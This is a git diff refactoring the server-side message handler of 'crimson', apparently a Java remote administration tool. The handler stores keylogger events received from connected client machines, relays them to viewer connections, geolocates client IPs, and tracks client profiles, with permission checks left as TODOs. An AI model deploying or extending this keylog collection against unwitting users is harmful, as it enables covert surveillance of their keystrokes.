@@ -40,6 +40,7 @@ import com.subterranean_security.crimson.core.proto.ClientAuth.RS_GroupChallenge
 import com.subterranean_security.crimson.core.proto.Delta.EV_ProfileDelta;
 import com.subterranean_security.crimson.core.proto.Delta.EV_ServerProfileDelta;
 import com.subterranean_security.crimson.core.proto.Delta.EV_ViewerProfileDelta;
+import com.subterranean_security.crimson.core.proto.Delta.ProfileTimestamp;
 import com.subterranean_security.crimson.core.proto.FileManager.RQ_FileListing;
 import com.subterranean_security.crimson.core.proto.FileManager.RS_FileHandle;
 import com.subterranean_security.crimson.core.proto.FileManager.RS_FileListing;
@@ -94,7 +95,7 @@ public class ServerExecutor extends BasicExecutor {
 						return;
 					}
 					if (m.hasEvProfileDelta()) {
-						ev_profileDelta(m);
+						ev_profileDelta(m.getEvProfileDelta());
 					} else if (m.hasEvKevent()) {
 						ev_kevent(m);
 					}
@@ -166,6 +167,8 @@ public class ServerExecutor extends BasicExecutor {
 						rs_file_handle(m);
 					} else if (m.hasRqKeyUpdate()) {
 						rq_key_update(m);
+					} else if (m.hasMiTriggerProfileDelta()) {
+						mi_trigger_profile_delta(m);
 					} else {
 						receptor.cq.put(m.getId(), m);
 					}
@@ -178,26 +181,6 @@ public class ServerExecutor extends BasicExecutor {
 		nbt.start();
 	}
 
-	private void rq_key_update(Message m) {
-		// TODO check permissions
-
-		RQ_KeyUpdate rq = m.getRqKeyUpdate();
-		Date target = new Date(rq.getStartDate());
-
-		ClientProfile cp = ServerStore.Profiles.getClient(rq.getCid());
-		if (cp != null) {
-			for (EV_KEvent k : cp.getKeylog().getEventsAfter(target)) {
-				receptor.handle.write(Message.newBuilder().setUrgent(true).setSid(rq.getCid()).setEvKevent(k).build());
-			}
-			receptor.handle.write(Message.newBuilder().setId(m.getId())
-					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(true)).build());
-		} else {
-			receptor.handle.write(Message.newBuilder().setId(m.getId())
-					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(false)).build());
-		}
-
-	}
-
 	private void ev_kevent(Message m) {
 		try {
 			ServerStore.Profiles.getClient(receptor.getCvid()).getKeylog().addEvent(m.getEvKevent());
@@ -208,12 +191,69 @@ public class ServerExecutor extends BasicExecutor {
 
 	}
 
+	private void ev_profileDelta(EV_ProfileDelta pd) {
+
+		if (pd.hasExtIp()) {
+			if (!receptor.getRemoteAddress().equals("127.0.0.1")) {
+				if (pd.getExtIp().equals("0.0.0.0")) {
+					pd = EV_ProfileDelta.newBuilder().mergeFrom(pd).setExtIp(receptor.getRemoteAddress()).build();
+				}
+				try {
+					HashMap<String, String> location = CUtil.Location.resolve(pd.getExtIp());
+					pd = EV_ProfileDelta.newBuilder().mergeFrom(pd).setCountry(location.get("countryname")).build();
+					pd = EV_ProfileDelta.newBuilder().mergeFrom(pd).setCountryCode(location.get("countrycode")).build();
+				} catch (IOException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				} catch (XMLStreamException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+			}
+		}
+		ServerStore.Profiles.getClient(receptor.getCvid()).amalgamate(pd);
+
+		for (int svid : ServerStore.Connections.getKeySet()) {
+			Receptor r = ServerStore.Connections.getConnection(svid);
+			// somehow check permissions TODO
+
+			if (r.getInstance() == Instance.VIEWER) {
+				r.handle.write(Message.newBuilder().setUrgent(true).setEvProfileDelta(pd).build());
+
+			}
+		}
+
+	}
+
+	private void mi_trigger_profile_delta(Message m) {
+		log.debug("mi_trigger_profile_delta");
+		for (ClientProfile cp : ServerStore.Profiles.getClientsUnderAuthority(receptor.getCvid())) {
+			boolean flag = true;
+			for (ProfileTimestamp pt : m.getMiTriggerProfileDelta().getProfileTimestampList()) {
+				if (pt.getCvid() == cp.getCvid()) {
+					log.debug("Updating client in viewer");
+					receptor.handle.write(Message.newBuilder().setUrgent(true)
+							.setEvProfileDelta(cp.getUpdates(new Date(pt.getTimestamp()))).build());
+					flag = false;
+					continue;
+				}
+			}
+			if (flag) {
+				log.debug("Sending new client to viewer");
+				receptor.handle.write(
+						Message.newBuilder().setUrgent(true).setEvProfileDelta(cp.getUpdates(new Date(0))).build());
+			}
+
+		}
+
+	}
+
 	private void mi_challenge_result(Message m) {
 		if (receptor.getState() != ConnectionState.AUTH_STAGE2) {
 			return;
 		}
 		if (m.getMiChallengeresult().getResult()) {
-			acceptClient();
+			aux_acceptClient();
 		} else {
 			log.debug("Authentication failed");
 			receptor.setState(ConnectionState.CONNECTED);
@@ -281,7 +321,8 @@ public class ServerExecutor extends BasicExecutor {
 			}
 		case NO_AUTH:
 			// come on in
-			acceptClient();
+			aux_acceptClient();
+			ev_profileDelta(auth.getPd());
 			break;
 		default:
 			break;
@@ -290,21 +331,40 @@ public class ServerExecutor extends BasicExecutor {
 
 	}
 
-	private void acceptClient() {
-		receptor.setState(ConnectionState.AUTHENTICATED);
-		receptor.setInstance(Instance.CLIENT);
-		ServerStore.Connections.add(receptor);
+	private void mi_stream_start(Message m) {
 
-		try {
-			if (ServerStore.Profiles.getClient(receptor.getCvid()) == null) {
-				ClientProfile cp = new ClientProfile(receptor.getCvid());
-				cp.getKeylog().pages.setDatabase(ServerStore.Databases.system);
-				ServerStore.Profiles.addClient(cp);
-			}
-		} catch (Exception e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
+		Param p = m.getMiStreamStart().getParam();
+		if (p.hasInfoParam()) {
+			StreamStore.addStream(new SInfoSlave(p));
 		}
+		if (p.hasSubscriberParam()) {
+			StreamStore.addStream(new SubscriberSlave(p));
+		}
+
+	}
+
+	private void mi_stream_stop(Message m) {
+		StreamStore.removeStream(m.getMiStreamStop().getStreamID());
+	}
+
+	private void rq_key_update(Message m) {
+		// TODO check permissions
+
+		RQ_KeyUpdate rq = m.getRqKeyUpdate();
+		Date target = new Date(rq.getStartDate());
+
+		ClientProfile cp = ServerStore.Profiles.getClient(rq.getCid());
+		if (cp != null) {
+			for (EV_KEvent k : cp.getKeylog().getEventsAfter(target)) {
+				receptor.handle.write(Message.newBuilder().setUrgent(true).setSid(rq.getCid()).setEvKevent(k).build());
+			}
+			receptor.handle.write(Message.newBuilder().setId(m.getId())
+					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(true)).build());
+		} else {
+			receptor.handle.write(Message.newBuilder().setId(m.getId())
+					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(false)).build());
+		}
+
 	}
 
 	private void rq_group_challenge(Message m) {
@@ -322,39 +382,6 @@ public class ServerExecutor extends BasicExecutor {
 		} catch (InterruptedException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
-		}
-
-	}
-
-	private void ev_profileDelta(Message m) {
-
-		EV_ProfileDelta pd = m.getEvProfileDelta();
-		if (pd.hasExtIp()) {
-			if (!receptor.getRemoteAddress().equals("127.0.0.1")) {
-				if (pd.getExtIp().equals("0.0.0.0")) {
-					pd = EV_ProfileDelta.newBuilder().mergeFrom(pd).setExtIp(receptor.getRemoteAddress()).build();
-				}
-				try {
-					HashMap<String, String> location = CUtil.Location.resolve(pd.getExtIp());
-					pd = EV_ProfileDelta.newBuilder().mergeFrom(pd).setCountry(location.get("countryname")).build();
-					pd = EV_ProfileDelta.newBuilder().mergeFrom(pd).setCountryCode(location.get("countrycode")).build();
-				} catch (IOException e) {
-					// TODO Auto-generated catch block
-					e.printStackTrace();
-				} catch (XMLStreamException e) {
-					// TODO Auto-generated catch block
-					e.printStackTrace();
-				}
-			}
-		}
-		for (int svid : ServerStore.Connections.getKeySet()) {
-			Receptor r = ServerStore.Connections.getConnection(svid);
-			// somehow check permissions TODO
-
-			if (r.getInstance() == Instance.VIEWER) {
-				r.handle.write(Message.newBuilder().setUrgent(true).setEvProfileDelta(pd).build());
-
-			}
 		}
 
 	}
@@ -441,7 +468,7 @@ public class ServerExecutor extends BasicExecutor {
 				}
 
 				for (Listener l : ServerStore.Listeners.listeners) {
-					sid.addListeners(l.getConfig());
+					sid.addListener(l.getConfig());
 				}
 
 				try {
@@ -551,24 +578,6 @@ public class ServerExecutor extends BasicExecutor {
 				.setRsAdvancedFileInfo(LocalFilesystem.getInfo(m.getRqAdvancedFileInfo().getFile())).build());
 	}
 
-	private void mi_stream_start(Message m) {
-
-		Param p = m.getMiStreamStart().getParam();
-		if (p.hasInfoParam()) {
-			StreamStore.addStream(new SInfoSlave(p));
-		}
-		if (p.hasSubscriberParam()) {
-			StreamStore.addStream(new SubscriberSlave(p));
-		}
-
-	}
-
-	private void mi_stream_stop(Message m) {
-
-		StreamStore.removeStream(m.getMiStreamStop().getStreamID());
-
-	}
-
 	private void rq_add_listener(Message m) {
 		log.debug("Executing: rq_add_listener");
 		// TODO check permissions
@@ -576,7 +585,7 @@ public class ServerExecutor extends BasicExecutor {
 				.setRsAddListener(RS_AddListener.newBuilder().setResult(true)).build());
 		ServerStore.Listeners.listeners.add(new Listener(m.getRqAddListener().getConfig()));
 		Message update = Message.newBuilder().setUrgent(true).setEvServerProfileDelta(
-				EV_ServerProfileDelta.newBuilder().addListeners(m.getRqAddListener().getConfig())).build();
+				EV_ServerProfileDelta.newBuilder().addListener(m.getRqAddListener().getConfig())).build();
 		ServerStore.Connections.sendToAll(Instance.VIEWER, update);
 
 	}
@@ -653,6 +662,23 @@ public class ServerExecutor extends BasicExecutor {
 
 	private void rq_change_client_state(Message m) {
 		log.debug("Executing: rq_change_client_state");
+	}
+
+	private void aux_acceptClient() {
+		receptor.setState(ConnectionState.AUTHENTICATED);
+		receptor.setInstance(Instance.CLIENT);
+		ServerStore.Connections.add(receptor);
+
+		try {
+			if (ServerStore.Profiles.getClient(receptor.getCvid()) == null) {
+				ClientProfile cp = new ClientProfile(receptor.getCvid());
+				cp.getKeylog().pages.setDatabase(ServerStore.Databases.system);
+				ServerStore.Profiles.addClient(cp);
+			}
+		} catch (Exception e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 	}
 
 }
